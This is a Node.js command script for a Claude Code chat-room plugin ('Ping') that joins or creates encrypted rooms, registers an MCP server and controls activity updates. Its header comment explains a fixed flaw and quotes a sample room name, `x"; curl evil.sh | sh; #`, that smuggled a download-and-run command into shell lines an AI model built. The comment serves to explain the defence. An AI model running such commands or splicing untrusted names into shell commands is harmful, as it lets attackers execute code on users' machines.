#!/usr/bin/env node
// /ping implementation — join a room, create one, or pause auto-delivery.
//
// This exists as a script rather than steps in the command prompt for one
// reason: SECURITY. The old /ping told the model to paste values into shell
// commands, including the room's name — and for a join, that name is chosen by
// whoever created the invite. A room called
//     x"; curl evil.sh | sh; #
// became shell metacharacters inside the command the model assembled, so simply
// accepting an invite could execute an attacker's code. Nothing here is built by
// string-splicing: every subprocess is execFile with an argv array (no shell),
// and the room name is only ever *data*.
//
// Usage:  ping-connect.mjs join <gk_code>
//         ping-connect.mjs new  <group name>
//         ping-connect.mjs off

import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { fileURLToPath } from "node:url";
import { dirname, join, resolve } from "node:path";
import { readState, updateState, upsertRoom, roomsOf, roomMatchesCwd, hooksHealth } from "./ping-state.mjs";
import { keyFromLink, linkWithKey, newRoomKey } from "./ping-crypto.mjs";

const execFileP = promisify(execFile);

const API = process.env.PING_API || "https://wsdslkxdoqwspjfozwvl.supabase.co/functions/v1/group-api";
const ANON =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndzZHNsa3hkb3F3c3BqZm96d3ZsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5ODg3NjQsImV4cCI6MjEwMDU2NDc2NH0.Kuop6VvV3Ykak8SqH8yBJbt0H6N-mB2-riSVFQS7aDo";

const die = (msg) => { console.log(msg); process.exit(1); };

const claimUrl = (token) => `https://theping.chat/fleet?claim=${encodeURIComponent(token)}`;

// Invite codes are ours and always [A-Za-z0-9_-]. Anything else is either a typo
// or an injection attempt; reject rather than sanitize so failures are obvious.
const CODE_RE = /^gk_[A-Za-z0-9_-]{4,80}$/;

function extractCode(input) {
  const m = String(input || "").match(/gk_[A-Za-z0-9_-]{4,80}/);
  return m && CODE_RE.test(m[0]) ? m[0] : null;
}

async function run(cmd, args) {
  try {
    const { stdout } = await execFileP(cmd, args, { timeout: 20_000 });
    return stdout.trim();
  } catch { return ""; }
}

async function displayName() {
  const git = await run("git", ["config", "user.name"]);
  if (git) return git.slice(0, 60);
  const who = await run("whoami", []);
  return (who || "agent").slice(0, 60);
}

async function callApi(body, token) {
  // curl via execFile: the JSON body is one argv element, never parsed by a shell.
  const out = await run("curl", [
    "-s", "-X", "POST", API,
    "-H", `apikey: ${ANON}`,
    "-H", "Content-Type: application/json",
    ...(token ? ["-H", `Authorization: Bearer ${token}`] : []),
    "-d", JSON.stringify(body),
  ]);
  try { return JSON.parse(out); } catch { return null; }
}

// Does this membership still exist on the server? A token survives in the state
// file long after the room was deleted or the member removed, and re-joining on
// a dead one is correct — so this has to be asked before deciding not to join.
const tokenAlive = async (token) => (await callApi({ action: "whoami" }, token))?.ok === true;

// Register the MCP server. This is the local sealing proxy, not the hosted URL:
// the room key lives on this machine, so the encryption has to happen here,
// before anything is sent. The proxy reads the token and key from the state
// file, so neither is passed on a command line or printed into the transcript.
/**
 * Point the `ping` MCP server at this copy of the plugin.
 *
 * Returns "current" when the registration already named this exact file —
 * nothing changed, so the session's live connection is the right one — or
 * "rewired" when it was added or repointed, which the running session cannot
 * pick up on its own. The path carries the plugin's version number, so a plugin
 * update silently strands the registration on the old version's cache
 * directory: the tools keep answering, from code releases out of date. That is
 * why a rewire has to say "/mcp reconnect" out loud instead of looking fine.
 */
async function wireMcp() {
  // fileURLToPath, not .pathname: on Windows the latter yields "/C:/Users/..."
  // with a leading slash and percent-escapes, which is not a path any program
  // can open — the MCP server would be registered pointing at nothing.
  const server = fileURLToPath(new URL("./ping-mcp.mjs", import.meta.url));
  // What Claude Code will actually use: `mcp get` reports the winning scope.
  const effective = async () => {
    try { return (await execFileP("claude", ["mcp", "get", "ping"], { timeout: 30_000 })).stdout ?? ""; } catch { return ""; }
  };
  if ((await effective()).includes(server)) return "current";
  const added = await addUserScope(server);
  if (!added) return false;
  // A `ping` at local or project scope beats user scope. A hosted one added by
  // hand (`claude mcp add --transport http ping …`) kept answering after /ping,
  // so the agent could neither encrypt nor read the room, and its tokens looked
  // like they died. Remove a local one; a project one is the team's .mcp.json,
  // so report it rather than edit someone else's file.
  if (!(await effective()).includes(server)) {
    try { await execFileP("claude", ["mcp", "remove", "ping", "--scope", "local"], { timeout: 30_000 }); } catch { /* none there */ }
    if (!(await effective()).includes(server)) return "shadowed";
  }
  return "rewired";
}

async function addUserScope(server) {
  const args = [
    "mcp", "add", "--transport", "stdio", "ping", "--scope", "user",
    "--", process.execPath, server,
  ];
  try {
    await execFileP("claude", args, { timeout: 30_000 });
    return true;
  } catch {
    // Already registered (or half-registered) -> remove and retry once.
    try {
      await execFileP("claude", ["mcp", "remove", "ping", "--scope", "user"], { timeout: 30_000 });
      await execFileP("claude", args, { timeout: 30_000 });
      return true;
    } catch { return false; }
  }
}

// `/ping join <link> --name "Rohan" --role backend`. The command asks the
// person for both, because the agent is where they already are — a web form
// they never opened can't. git config is the fallback for an unattended run.
export function takeFlags(rest) {
  const flags = {};
  const words = [];
  const parts = String(rest || "").match(/"[^"]*"|\S+/g) ?? [];
  // A flag takes every word up to the next flag. Quoting a two-word name is
  // the obvious way to write it and works everywhere except the place it is
  // most needed: Windows PowerShell strips embedded double quotes when it
  // calls a native binary, so `--name "rohan ec2"` arrived here as two bare
  // words. The old parser took the first and spilled the second into the
  // invite link — joining under a silently wrong name, with nothing to show
  // for it but a member list that disagreed with what was typed.
  const ends = (w) => /^--/.test(w) || /^(https?:\/\/|gk_)/.test(w);
  for (let i = 0; i < parts.length; i++) {
    const m = parts[i].match(/^--(name|role)$/);
    if (!m || !parts[i + 1] || ends(parts[i + 1])) { words.push(parts[i]); continue; }
    const taken = [];
    while (i + 1 < parts.length && !ends(parts[i + 1])) taken.push(parts[++i]);
    flags[m[1]] = taken.join(" ").replace(/^"|"$/g, "");
  }
  return { flags, rest: words.join(" ") };
}

async function connect(mode, restRaw) {
  const { flags, rest } = takeFlags(restRaw);
  const name = (flags.name || "").trim().slice(0, 40) || (await displayName());
  const role = (flags.role || "").trim().toLowerCase() || undefined;
  let res;
  // The room key rides in the invite link's fragment, which is never sent to a
  // server. Take it before the code goes anywhere; a link without one means the
  // room predates encryption, or somebody shared only the part before the #.
  let key = mode === "join" ? keyFromLink(rest) : newRoomKey();
  if (mode === "join") {
    const code = extractCode(rest);
    if (!code) die("That doesn't look like a Ping invite. Expected a link containing gk_… — check the link and try again.");
    // Already in this room from this machine? Running /ping again is what
    // everybody does when they are not sure the first one worked, and every
    // run used to mint ANOTHER membership server-side: the first real two-person
    // test ended with six member rows for two people, and a member list that
    // could not tell one person who joined three times from three people.
    //
    // The server cannot fix this. Returning the existing token to whoever asks
    // would hand anyone holding the invite link another member's identity, and
    // voiding the old membership would let them kick that member out. Both are
    // worse than the duplicate. Here, though, we already hold the token, so
    // there is nothing to hand out and nothing to guess.
    const mine = roomsOf(readState()).find((r) => r.code === code && r.token);
    if (mine && (await tokenAlive(mine.token))) {
      // Make it active, but DO NOT touch where it is scoped. Re-running /ping
      // inside a subdirectory would otherwise silently narrow a room that was
      // deliberately widened with `/ping anywhere` — and the person doing it is
      // only trying to check the room still works. /ping here and /ping
      // anywhere already exist for changing scope on purpose.
      updateState((s) => upsertRoom(s, { ...mine }));
      const wired = await wireMcp();
      console.log(JSON.stringify({
        ok: true, already_member: true, connected_as: mine.name ?? null, active_room: mine.group,
        scoped_to: mine.path ?? "every project on this machine", mcp_registered: wired !== false && wired !== "shadowed", reconnect_required: wired === "rewired",
        rooms_watched: roomsOf(readState()).length, encrypted: Boolean(mine.key),
        note: "You were already in this room on this machine, so no second membership was created — the room is just active here now. To join as somebody else, or from scratch, leave it first with ping_leave.",
      }, null, 2));
      return;
    }
    // has_key: this client encrypts. An encrypted room refuses a join without it.
    res = await callApi({ action: "join", link: code, name, role, has_key: Boolean(key) });
    if (res?.e2e && !key) die("This room is end-to-end encrypted, and the link you used has no key — the part after #k=. Chat apps sometimes cut it off. Ask whoever shared the room for the whole link, then run /ping with it again.");
  } else {
    const group = String(rest || "").trim().slice(0, 80);
    if (!group) die("Give the room a name:  /ping new <group name>");
    // e2e: the key was made above, on this machine; the server never sees it.
    res = await callApi({ action: "create_group", name: group, host_name: name, role, e2e: true });
  }

  if (!res) die("Couldn't reach Ping. Check your connection and try again.");
  if (!res.token) die(`Ping: ${res.error || "the server didn't return a member token."}`);

  const group = typeof res.group === "string" ? res.group : (mode === "join" ? "room" : String(rest).trim());

  // Seed the cursor to NOW. Seeding from the first poll's page instead meant a
  // busy room replayed up to 200 old messages at you as if they were new.
  // Scope the room to the project it was joined in: the state file is shared
  // across every project on this machine, so without a path this room's traffic
  // (and its write token) would be delivered into unrelated work.
  updateState((s) => upsertRoom(s, {
    token: res.token, group, name, key: key ?? undefined,
    // The invite code is what identifies the room BEFORE a join tells us its
    // name, so it is the only thing a re-join can be matched against.
    ...(mode === "join" ? { code: extractCode(rest) } : res.invite_code ? { code: res.invite_code } : {}),
    path: process.cwd(), last_seen: new Date().toISOString(),
  }));

  const wired = await wireMcp();

  console.log(JSON.stringify({
    ok: true,
    connected_as: name,
    role: res.your_role ?? null,
    ...(res.role_note ? { role_note: res.role_note } : {}),
    owner: res.owner === true,
    active_room: group,
    scoped_to: process.cwd(),
    mcp_registered: wired !== false && wired !== "shadowed",
    ...(wired === "shadowed" ? { mcp_warning: "This project's .mcp.json defines its own `ping` server, and Claude Code uses that one instead of the plugin's — it cannot encrypt, so it cannot read or write this room. Remove the ping entry from .mcp.json (or run `claude mcp remove ping --scope project`), then restart Claude Code." } : {}),
    // The server counts members sharing this name and says so. It was being
    // thrown away here, which is why six duplicates accumulated unnoticed.
    ...(res.warning ? { warning: res.warning } : {}),
    // True only when the registration actually changed under a running session.
    reconnect_required: wired === "rewired",
    ...(wired === "rewired" ? { reconnect_note: "The ping MCP server was just pointed at this plugin version, and this session is still holding the old connection. Run /mcp reconnect — or restart Claude Code — before using the ping tools, or they will answer from the previous version." } : {}),
    rooms_watched: roomsOf(readState()).length,
    ...(hooksHealth(readState()).stale
      ? { hooks_warning: "Joined, but this session's hooks have not run, so messages will not arrive on their own yet. Fully quit and reopen Claude Code — a fresh install always needs this once." }
      : {}),
    encrypted: Boolean(key),
    encryption_note: key
      ? "End-to-end encrypted: messages, shared context, task details and results are sealed on this machine first, so the server can't read them. Room names, member names and roles are not sealed. The key is the part of the invite link after the # — share the whole link, and treat it like a password."
      : "NOT end-to-end encrypted: this is an older room that was made without a key, so the server can read it. New rooms are always encrypted — create one with /ping new <name> for anything sensitive.",
    // The key is appended here, never server-side — the server is never told it.
    invite_url: res.invite_url ? linkWithKey(res.invite_url, key) : null,
    webhook_url: res.webhook_url ?? null,
    // Only the creator gets a claim link, and only for a room they just made.
    // It carries the host token, so it proves ownership the way the shareable
    // invite link cannot -- show it to your own user, never to the room.
    claim_url: mode === "new" ? claimUrl(res.token) : null,
  }, null, 2));
  if (!wired) console.log("\nNote: `claude mcp add` didn't succeed — run /ping again, or add the server manually.");
}

async function main() {
  const [mode, ...rest] = process.argv.slice(2);
  const arg = rest.join(" ");

  // Automatic activity updates, off by default. On, every time the agent goes
  // idle the Stop hook reads the session transcript and logs one line — files
  // edited, commands run, commits made — to the ACTIVE room, at most once a
  // minute. Of what you typed it sends only the first sentence of the latest request,
  // never the rest of the conversation, file contents or tool output.
  if (mode === "status") {
    const on = arg.trim().toLowerCase() === "on";
    const off = arg.trim().toLowerCase() === "off";
    if (!on && !off) die("Usage:  /ping status on   |   /ping status off");
    updateState((s) => ({ ...s, status: on }));
    const after = readState();
    const room = after.active;
    const health = hooksHealth(after);
    console.log(JSON.stringify({
      ok: true,
      status: on,
      room: room ?? null,
      // Reporting "on" for something that cannot happen is what hid a dead
      // hook for fifteen days. Say when the hooks last ran, every time.
      hooks_last_ran: health.ran ?? "never",
      ...(on && health.stale ? { hooks_warning: "Status is recorded, but this session's hooks have not run — so nothing will actually be posted. Activity updates come from a hook Claude Code loads when a session STARTS, so installing or updating the plugin inside a running session leaves them unregistered. Fully quit and reopen Claude Code — not /mcp reconnect, not resume." } : {}),
      note: on
        ? `Auto-updates on. When this agent goes idle it will post a one-line summary to "${room ?? "your active room"}", at most once a minute: the kind of work it did ("working on the backend"), your project folder's name, the first sentence of your latest request, and commit subjects as written. File contents, command text and the rest of the conversation are not sent. Turn off with /ping status off.`
        : "Auto-updates off: no idle summaries. While this session is connected, Ping still posts your new commit subjects, or which part of the project you're working on, to the active room about once a minute.",
    }, null, 2));
    return;
  }

  if (mode === "off") {
    updateState((s) => ({ ...s, watch: false }));
    console.log(JSON.stringify({ ok: true, watch: false, rooms_kept: roomsOf(readState()).length }));
    return;
  }
  // Link this machine's agent to your Ping account, so you can approve its work
  // and send it instructions from the Ping app. The member token and room key
  // ride in the URL fragment, which browsers never send to a server.
  if (mode === "link" || mode === "runner") {
    const state = readState();
    const here = roomsOf(state).filter((r) => roomMatchesCwd(r, process.cwd()));
    const room = here.find((r) => r.group === state.active) ?? here[here.length - 1];
    if (!room) die("No Ping room for this folder. Join one first with /ping <invite-link>.");
    if (mode === "runner") {
      const script = join(dirname(fileURLToPath(import.meta.url)), "ping-runner.mjs");
      console.log(JSON.stringify({
        ok: true,
        room: room.group ?? "room",
        command: `cd ${JSON.stringify(process.cwd())} && node ${JSON.stringify(script)}`,
        note: "Run this in a terminal and leave it open. When a teammate posts in the room, Claude reads this project (read-only) and sends a plan to your Ping app; it only changes files after you approve. Link the app first with /ping link.",
      }, null, 2));
      return;
    }
    console.log(JSON.stringify({
      ok: true,
      room: room.group ?? "room",
      agent: room.name ?? null,
      link_url: `https://theping.chat/app/agents#link=${room.token}${room.key ? `&k=${room.key}` : ""}`,
      note: "Open this on your phone while signed in to Ping, or paste it into the Agents tab. It proves this agent is yours and unlocks the room's messages, so don't share it.",
    }, null, 2));
    return;
  }
  // Reprint the claim links for rooms this machine already joined, so a room
  // created before claim links existed can still be adopted in the web app.
  if (mode === "claim") {
    const rooms = roomsOf(readState());
    if (!rooms.length) die("No Ping rooms on this machine yet. Run /ping new <name> or /ping <invite-link> first.");
    console.log(JSON.stringify({
      ok: true,
      note: "Open a claim link while signed in to theping.chat to adopt that room. Only works for rooms this agent created.",
      rooms: rooms.map((r) => ({ room: r.group ?? "room", claim_url: claimUrl(r.token) })),
    }, null, 2));
    return;
  }
  // Where each room is scoped, and which ones are live in this directory.
  if (mode === "rooms") {
    const cwd = process.cwd();
    const rooms = roomsOf(readState());
    if (!rooms.length) die("No Ping rooms on this machine yet. Run /ping new <name> or /ping <invite-link> first.");
    console.log(JSON.stringify({
      ok: true,
      cwd,
      note: "A room only delivers messages while you work inside its directory. `anywhere` rooms deliver everywhere.",
      rooms: rooms.map((r) => ({
        room: r.group ?? "room",
        scope: r.path ?? "anywhere",
        active_here: roomMatchesCwd(r, cwd),
      })),
    }, null, 2));
    return;
  }

  // Rebind the active room to this directory, or release it to everywhere.
  if (mode === "here" || mode === "anywhere") {
    const state = readState();
    const rooms = roomsOf(state);
    if (!rooms.length) die("No Ping rooms on this machine yet.");
    const target = rooms.find((r) => r.group && r.group === state.active) ?? rooms[rooms.length - 1];
    const path = mode === "here" ? process.cwd() : undefined;
    updateState((s) => ({
      ...s,
      rooms: roomsOf(s).map((r) => (r.token === target.token ? { ...r, path } : r)),
    }));
    console.log(JSON.stringify({
      ok: true,
      room: target.group ?? "room",
      scope: path ?? "anywhere",
      note: mode === "here"
        ? "This room now only delivers messages while you work in that directory."
        : "This room now delivers messages in every project on this machine.",
    }, null, 2));
    return;
  }

  if (mode === "detail") {
    const level = arg.trim().toLowerCase();
    if (!["labels", "files", "task"].includes(level)) die("Usage:  /ping detail labels   |   /ping detail files   |   /ping detail task");
    const before = readState();
    if (!before.active) die("No active room on this machine. Join one first with /ping <invite-link>.");
    // Per room, on this machine: the person whose work is reported decides how much
    // of it is shared, not the room's owner.
    updateState((s) => ({ ...s, rooms: (s.rooms ?? []).map((r) => (r.group === s.active ? { ...r, detail: level } : r)) }));
    const notes = {
      labels: "Posts say what kind of work it is and which part of the project: \"finished: building · working on the frontend\". No file names, no request text.",
      files: "Posts also name the files touched, by name only: \"finished: building · created calc.html; deleted snake.html\". No paths, no file contents, no request text.",
      task: "Posts also quote the first sentence of each request, with passwords, keys and tokens stripped, as well as the file names. Turn it back down with /ping detail labels.",
    };
    console.log(JSON.stringify({ ok: true, room: before.active, detail: level, note: notes[level] }, null, 2));
    return;
  }

  if (mode === "join" || mode === "new") return connect(mode, arg);
  die('Usage:  /ping <invite-link>   ·   /ping new <group name>   ·   /ping rooms   ·   /ping here   ·   /ping anywhere   ·   /ping detail labels|files|task   ·   /ping claim   ·   /ping link   ·   /ping runner   ·   /ping off');
}

// Only when run as a command. Without this, importing anything from here —
// the selfcheck does, to test the flag parser — runs the CLI, prints a usage
// line and exits 1.
if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  main().catch((e) => die("Ping: " + String(e?.message || e)));
}
